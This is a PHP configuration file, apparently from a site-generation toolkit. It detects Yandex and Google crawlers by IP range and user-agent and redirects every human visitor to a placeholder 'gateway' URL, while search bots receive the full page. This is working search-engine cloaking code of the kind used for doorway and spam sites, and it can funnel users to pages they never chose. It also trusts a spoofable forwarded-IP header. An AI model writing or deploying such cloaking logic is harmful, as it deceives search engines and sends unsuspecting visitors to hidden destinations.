<?php
/**
 * Config for AI multipage builds (theme + windowId). Not used by legacy PHP templates.
 * __AURORA_GATEWAY_URL__ is replaced at build time from brand-chrome GATEWAY_URL.
 */
declare(strict_types=1);

$userRedirectUrl = '__AURORA_GATEWAY_URL__';

$yandexIpRanges = [
    '5.45.192.0/18',
    '5.255.192.0/18',
    '37.9.64.0/18',
    '37.140.128.0/18',
    '77.88.0.0/18',
    '84.252.160.0/19',
    '87.250.224.0/19',
    '90.156.176.0/20',
    '92.255.112.0/20',
    '93.158.128.0/18',
    '95.108.128.0/17',
    '141.8.128.0/18',
    '178.154.128.0/18',
    '185.32.187.0/24',
    '213.180.192.0/19',
];
$yandexIpRangesV6 = [
    '2a02:6b8::/29',
];

function aurora_ipv4_in_cidr(string $ip, string $cidr): bool {
    [$subnet, $bits] = explode('/', $cidr);
    $long = ip2long($ip);
    $subnetLong = ip2long($subnet);
    if ($long === false || $subnetLong === false) {
        return false;
    }
    $mask = -1 << (32 - (int) $bits);
    return ($long & $mask) === ($subnetLong & $mask);
}

function aurora_ipv6_in_cidr(string $ip, string $cidr): bool {
    [$subnet, $bits] = explode('/', $cidr);
    $addrBin = @inet_pton($ip);
    $subnetBin = @inet_pton($subnet);
    if ($addrBin === false || $subnetBin === false || strlen($addrBin) !== 16) {
        return false;
    }
    $bits = (int) $bits;
    for ($i = 0; $i < 16; $i++) {
        $bitsLeft = $bits - ($i * 8);
        if ($bitsLeft <= 0) {
            break;
        }
        $maskByte = $bitsLeft >= 8 ? 0xFF : (0xFF << (8 - $bitsLeft)) & 0xFF;
        if ((ord($addrBin[$i]) & $maskByte) !== (ord($subnetBin[$i]) & $maskByte)) {
            return false;
        }
    }
    return true;
}

function is_yandex_ip(string $ip): bool {
    global $yandexIpRanges, $yandexIpRangesV6;
    if ($ip === '') {
        return false;
    }
    if (strpos($ip, ':') !== false) {
        foreach ($yandexIpRangesV6 as $cidr) {
            if (aurora_ipv6_in_cidr($ip, $cidr)) {
                return true;
            }
        }
        return false;
    }
    foreach ($yandexIpRanges as $cidr) {
        if (aurora_ipv4_in_cidr($ip, $cidr)) {
            return true;
        }
    }
    return false;
}

function aurora_client_ip(): string {
    $xff = (string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? '');
    if ($xff !== '') {
        $parts = explode(',', $xff);
        $first = trim((string) ($parts[0] ?? ''));
        if ($first !== '') {
            return $first;
        }
    }
    $real = (string) ($_SERVER['HTTP_X_REAL_IP'] ?? '');
    if ($real !== '') {
        return $real;
    }
    return (string) ($_SERVER['REMOTE_ADDR'] ?? '');
}

function is_yandex_indexing_bot(): bool {
    $ip = aurora_client_ip();
    if (is_yandex_ip($ip)) {
        return true;
    }
    $ua = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');
    if ($ua === '') {
        return false;
    }
    if (preg_match('/YaBrowser|YandexBrowser/i', $ua)) {
        return false;
    }
    return (bool) preg_match(
        '/YandexBot|YandexImages|YandexVideo|YandexNews|YandexAccessibility|YandexMobile|YandexRenderResources|YandexWebmaster|YandexScreenshot|YandexPagechecker|YandexOntoDB|YandexVerticals|YandexMarket|YandexCatalog/i',
        $ua
    );
}

/** Google indexing crawlers (Search Console, Googlebot). */
function is_google_indexing_bot(): bool {
    $ua = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');
    if ($ua === '') {
        return false;
    }
    return (bool) preg_match(
        '/Googlebot|Google-InspectionTool|GoogleOther|Storebot-Google|Google-Extended/i',
        $ua
    );
}

/** Yandex or Google bot — full HTML for SEO. */
function is_search_indexing_bot(): bool {
    return is_yandex_indexing_bot() || is_google_indexing_bot();
}

/**
 * Mode bot_gate: redirect humans to $userRedirectUrl; bots stay on site (HTTP 200).
 */
function aurora_maybe_redirect_human_visitor(): void {
    if (is_search_indexing_bot()) {
        return;
    }
    global $userRedirectUrl;
    $url = trim((string) ($userRedirectUrl ?? ''));
    if ($url === '' || !preg_match('#^https?://#i', $url)) {
        return;
    }
    header('Location: ' . $url, true, 302);
    exit;
}
